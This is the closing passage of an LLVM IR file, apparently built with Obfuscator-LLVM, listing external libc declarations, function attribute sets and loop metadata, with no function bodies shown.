; Function Attrs: nounwind
declare i32 @fputs(i8* nocapture readonly, %struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setsid() local_unnamed_addr #5

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #5

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #15

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #16

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #16

attributes #0 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #15 = { noreturn nounwind }
attributes #16 = { nounwind readonly }
attributes #17 = { nounwind returns_twice }
attributes #18 = { nounwind readnone }

!llvm.ident = !{!0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2, !3}
!2 = !{!"llvm.loop.vectorize.width", i32 1}
!3 = !{!"llvm.loop.interleave.count", i32 1}
!4 = !{!5}
!5 = distinct !{!5, !6}
!6 = distinct !{!6, !"LVerDomain"}
!7 = !{!8}
!8 = distinct !{!8, !6}
!9 = distinct !{!9, !10}
!10 = !{!"llvm.loop.unroll.disable"}
!11 = distinct !{!11, !2, !3}
!12 = distinct !{!12, !2, !3}
!13 = !{i32 -2146612692}
!14 = !{i32 -2146611984}
!15 = distinct !{!15, !2, !3}
!16 = distinct !{!16, !17, !2, !3}
!17 = !{!"llvm.loop.unroll.runtime.disable"}
!18 = !{i32 -2146610396}
!19 = !{i32 -2146609669}
!20 = !{i32 -2146608844}
